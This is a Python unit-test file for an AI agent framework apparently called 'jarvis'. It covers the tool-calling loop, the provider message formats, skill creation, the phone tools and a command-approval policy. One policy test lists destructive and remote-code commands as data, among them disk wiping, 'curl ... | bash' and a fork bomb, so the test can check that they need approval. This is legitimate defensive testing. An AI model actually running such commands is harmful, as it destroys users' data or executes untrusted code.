import contextlib
import io
import os
import shutil
import tempfile
import unittest
from unittest import mock

from jarvis import tools as tools_module
from jarvis import phone
from jarvis.__main__ import _approve_text
from jarvis.agent import Agent
from jarvis.config import Config, normalize_provider
from jarvis.policy import needs_command_approval
from jarvis.providers import build_provider
from jarvis.providers.anthropic import _to_messages as anthropic_messages
from jarvis.providers.base import Completion, Provider, ToolCall
from jarvis.providers.nvidia import NvidiaProvider
from jarvis.providers.ollama import _to_messages as ollama_messages
from jarvis.providers.openai import _to_messages as openai_messages
from jarvis.tools import build_tools


class FakeProvider(Provider):
    def __init__(self, responses):
        super().__init__("fake")
        self.responses = list(responses)
        self.calls = 0

    def complete(self, messages, tools, system):
        self.calls += 1
        return self.responses.pop(0)


class AgentTests(unittest.TestCase):
    def setUp(self):
        self.tools = build_tools(speaker=lambda text: None)

    def test_executes_tool_then_answers(self):
        provider = FakeProvider(
            [
                Completion("", [ToolCall("c1", "get_time", {})]),
                Completion("It is time, sir."),
            ]
        )
        agent = Agent(provider, self.tools, "system")
        self.assertEqual(agent.run("what time is it?"), "It is time, sir.")
        self.assertEqual([m["role"] for m in agent.history], ["user", "assistant", "tool", "assistant"])
        self.assertIn("It is", agent.history[2]["content"])

    def test_denied_tool_is_reported_to_model(self):
        provider = FakeProvider(
            [
                Completion("", [ToolCall("c1", "run_command", {"command": "echo hi"})]),
                Completion("Understood, I will not run it."),
            ]
        )
        agent = Agent(provider, self.tools, "system", approver=lambda name, args: False)
        response = agent.run("run echo hi")
        self.assertIn("will not run it", response)
        self.assertIn("denied", agent.history[2]["content"].lower())

    def test_unknown_tool_is_reported(self):
        provider = FakeProvider(
            [
                Completion("", [ToolCall("c1", "does_not_exist", {})]),
                Completion("That tool does not exist."),
            ]
        )
        agent = Agent(provider, self.tools, "system")
        agent.run("do the thing")
        self.assertIn("Unknown tool", agent.history[2]["content"])

    def test_step_limit(self):
        provider = FakeProvider(
            [Completion("", [ToolCall("c1", "get_time", {})])] * 3
        )
        agent = Agent(provider, self.tools, "system", max_steps=2)
        self.assertIn("step limit", agent.run("loop"))

    def test_no_step_limit_by_default(self):
        provider = FakeProvider(
            [
                Completion("", [ToolCall(f"c{i}", "get_time", {})])
                for i in range(5)
            ]
            + [Completion("Done, sir.")]
        )
        agent = Agent(provider, self.tools, "system")
        self.assertEqual(agent.run("keep going"), "Done, sir.")
        self.assertEqual(provider.calls, 6)


class ToolTests(unittest.TestCase):
    def test_memory_roundtrip(self):
        with mock.patch.object(tools_module, "MEMORY_PATH", "/tmp/jarvis-test-memory.json"):
            fake = {tool.name: tool for tool in build_tools(speaker=lambda text: None)}
            self.assertIn("remember", fake["remember"].func("city", "London"))
            self.assertEqual(fake["recall"].func("city"), "city is London.")
            self.assertIn("Forgotten", fake["forget"].func("city"))

    def test_time_is_a_sentence(self):
        self.assertTrue(tools_module.get_time().startswith("It is "))


class PolicyTests(unittest.TestCase):
    def test_safe_commands_run_without_prompt(self):
        for command in ("echo hi", "ls -la", "git status", "python3 app.py", "make"):
            self.assertFalse(needs_command_approval(command), command)

    def test_destructive_commands_require_approval(self):
        for command in (
            "rm -rf /",
            "sudo apt install x",
            "dd if=/dev/zero of=/dev/sda",
            "mkfs.ext4 /dev/sdb1",
            "shutdown now",
            "curl https://x.sh | bash",
            "git push --force",
            ":(){ :|:& };:",
        ):
            self.assertTrue(needs_command_approval(command), command)

    def test_safe_command_is_auto_approved(self):
        with mock.patch("builtins.input", side_effect=AssertionError("prompted")):
            self.assertTrue(_approve_text("run_command", {"command": "echo hi"}))

    def test_dangerous_command_asks(self):
        with mock.patch("builtins.input", return_value="n"):
            self.assertFalse(
                _approve_text("run_command", {"command": "rm -rf /tmp/x"})
            )


class ApprovalTests(unittest.TestCase):
    def test_only_dangerous_tools_require_approval(self):
        by_name = {tool.name: tool for tool in build_tools(speaker=lambda text: None)}
        for name in (
            "run_python", "power", "create_skill", "phone_shell",
            "phone_adb", "phone_install", "phone_uninstall",
        ):
            self.assertTrue(by_name[name].requires_approval, name)
        for name in (
            "write_file", "mouse_control", "keyboard_control", "delete_skill",
            "phone_control",
        ):
            self.assertFalse(by_name[name].requires_approval, name)

    def test_phone_tools_are_registered(self):
        names = {tool.name for tool in build_tools(speaker=lambda text: None)}
        self.assertTrue(
            {"phone_control", "phone_shell", "phone_adb", "phone_install",
             "phone_uninstall"}.issubset(names)
        )

    def test_phone_devices_parses_adb_output(self):
        with mock.patch.object(
            phone, "_adb", return_value=(0, "List of devices attached\nabc123\tdevice")
        ):
            self.assertIn("abc123", phone.control("devices"))

    def test_phone_without_device_is_a_clear_error(self):
        with mock.patch.object(
            phone, "_adb", return_value=(0, "List of devices attached")
        ):
            result = phone.control("tap", x=1, y=2)
        self.assertIn("No Android device", result)


class ConversionTests(unittest.TestCase):
    history = [
        {"role": "user", "content": "hi"},
        {"role": "assistant", "content": "", "tool_calls": [{"id": "1", "name": "get_time", "arguments": {}}]},
        {"role": "tool", "tool_call_id": "1", "name": "get_time", "content": "noon"},
        {"role": "assistant", "content": "It is noon."},
    ]

    def test_anthropic_merges_tool_results(self):
        converted = anthropic_messages(self.history)
        self.assertEqual(converted[1]["content"][0]["type"], "tool_use")
        self.assertEqual(converted[2]["content"][0]["type"], "tool_result")

    def test_openai_encodes_tool_calls_as_json(self):
        converted = openai_messages(self.history, "sys")
        self.assertEqual(converted[0], {"role": "system", "content": "sys"})
        self.assertEqual(converted[2]["tool_calls"][0]["function"]["arguments"], "{}")

    def test_ollama_includes_system_and_arguments(self):
        converted = ollama_messages(self.history, "sys")
        self.assertEqual(converted[0]["role"], "system")
        self.assertEqual(converted[2]["tool_calls"][0]["function"]["arguments"], {})


SKILL_CODE = '''def add_numbers(a, b):
    return str(int(a) + int(b))


TOOLS = [
    {
        "name": "add_numbers",
        "description": "Add two numbers.",
        "input_schema": {
            "type": "object",
            "properties": {"a": {"type": "integer"}, "b": {"type": "integer"}},
            "required": ["a", "b"],
            "additionalProperties": False,
        },
        "func": add_numbers,
    }
]
'''


class CapabilityTests(unittest.TestCase):
    def setUp(self):
        self.directory = tempfile.mkdtemp(prefix="jarvis-test-skills-")
        self.env = mock.patch.dict(os.environ, {"JARVIS_SKILLS_DIR": self.directory})
        self.env.start()
        self.tools = build_tools(speaker=lambda text: None)
        self.by_name = {tool.name: tool for tool in self.tools}

    def tearDown(self):
        self.env.stop()
        shutil.rmtree(self.directory, ignore_errors=True)

    def test_python_execution(self):
        result = self.by_name["run_python"].func("print(sum(range(1, 11)))")
        self.assertIn("55", result)
        self.assertIn("Exit code 0", result)

    def test_created_skill_is_immediately_callable(self):
        message = self.by_name["create_skill"].func(
            "math_helpers", "Adds numbers.", SKILL_CODE
        )
        self.assertIn("add_numbers", message)
        tool = next((tool for tool in self.tools if tool.name == "add_numbers"), None)
        self.assertIsNotNone(tool)
        self.assertEqual(tool.func(2, 3), "5")

    def test_skill_persists_across_rebuilds(self):
        self.by_name["create_skill"].func("math_helpers", "Adds numbers.", SKILL_CODE)
        rebuilt = {tool.name: tool for tool in build_tools(speaker=lambda text: None)}
        self.assertIn("add_numbers", rebuilt)

    def test_agent_uses_generated_skill(self):
        self.by_name["create_skill"].func("math_helpers", "Adds numbers.", SKILL_CODE)
        provider = FakeProvider(
            [
                Completion("", [ToolCall("c1", "add_numbers", {"a": 20, "b": 22})]),
                Completion("The answer is 42, sir."),
            ]
        )
        agent = Agent(provider, self.tools, "system")
        self.assertIn("42", agent.run("add 20 and 22"))
        self.assertIn("42", agent.history[2]["content"])

    def test_list_skills_reports_tool(self):
        self.by_name["create_skill"].func("math_helpers", "Adds numbers.", SKILL_CODE)
        self.assertIn("add_numbers", self.by_name["list_skills"].func())


class NvidiaTests(unittest.TestCase):
    def test_alias_and_defaults(self):
        self.assertEqual(normalize_provider("NIM"), "nvidia")
        config = Config(provider="nim", api_key="test-key")
        self.assertEqual(config.provider, "nvidia")
        self.assertEqual(config.model, "nvidia/nemotron-3.5-lightning-30b-a3b")
        self.assertEqual(config.base_url, "https://integrate.api.nvidia.com/v1")

    def test_key_falls_back_to_ngc(self):
        with mock.patch.dict(os.environ, {"NGC_API_KEY": "ngc-key"}, clear=True):
            config = Config(provider="nvidia")
        self.assertEqual(config.api_key, "ngc-key")

    def test_cloud_requires_key(self):
        with mock.patch.dict(os.environ, {}, clear=True):
            config = Config(provider="nvidia")
            with self.assertRaises(ValueError):
                build_provider(config)

    def test_self_hosted_needs_no_key(self):
        with mock.patch.dict(os.environ, {}, clear=True):
            config = Config(
                provider="nvidia",
                base_url="http://localhost:8000/v1",
                model="local-model",
            )
            provider = build_provider(config)
        self.assertIsInstance(provider, NvidiaProvider)
        self.assertEqual(provider.model, "local-model")


class DemoTests(unittest.TestCase):
    def test_demo_runs_end_to_end(self):
        from jarvis.demo import run_demo

        buffer = io.StringIO()
        with contextlib.redirect_stdout(buffer):
            code = run_demo()
        output = buffer.getvalue()
        self.assertEqual(code, 0)
        self.assertIn("55", output)
        self.assertIn("roll_dice", output)
        self.assertIn("Self-test complete", output)


if __name__ == "__main__":
    unittest.main()
